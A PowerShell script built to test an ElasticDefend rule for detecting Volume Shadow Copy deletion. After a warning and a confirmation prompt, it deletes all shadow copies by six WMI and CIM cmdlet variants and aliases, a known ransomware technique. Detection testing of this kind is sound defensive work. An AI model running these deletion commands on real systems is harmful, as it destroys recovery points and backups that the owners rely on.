Write-Warning "This script tests Volume Shadow Copy deletion detection. Run in a TEST environment."
Write-Host "`n=== Testing ElasticDefend Rule: Volume Shadow Copy Deletion via PowerShell ===`n"

# Confirmation prompt for safety
$confirmation = Read-Host "Do you want to proceed? (Y/N)"
if ($confirmation -ne "Y") { exit }

# Test 1: WMI Object Deletion using Delete() method
try {
    Write-Host "`n[Test 1] Attempting WMI Delete() method..."
    Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
} catch {
    Write-Host "[Test 1 Error] $_"
}

# Test 2: Using gwmi alias with Delete()
try {
    Write-Host "`n[Test 2] Attempting gwmi alias..."
    gwmi Win32_ShadowCopy | % { $_.Delete() }
} catch {
    Write-Host "[Test 2 Error] $_"
}

# Test 3: Remove-WmiObject command
try {
    Write-Host "`n[Test 3] Attempting Remove-WmiObject..."
    Get-WmiObject Win32_ShadowCopy | Remove-WmiObject
} catch {
    Write-Host "[Test 3 Error] $_"
}

# Test 4: Using rwmi alias
try {
    Write-Host "`n[Test 4] Attempting rwmi alias..."
    gwmi Win32_ShadowCopy | rwmi
} catch {
    Write-Host "[Test 4 Error] $_"
}

# Test 5: CIM Instance deletion
try {
    Write-Host "`n[Test 5] Attempting CIM methods..."
    Get-CimInstance -ClassName Win32_ShadowCopy | Remove-CimInstance
} catch {
    Write-Host "[Test 5 Error] $_"
}

# Test 6: Using gcim/rcim aliases
try {
    Write-Host "`n[Test 6] Attempting CIM aliases..."
    gcim Win32_ShadowCopy | rcim
} catch {
    Write-Host "[Test 6 Error] $_"
}

Write-Host "`nTest sequence completed. Check your ElasticDefend alerts for detection."

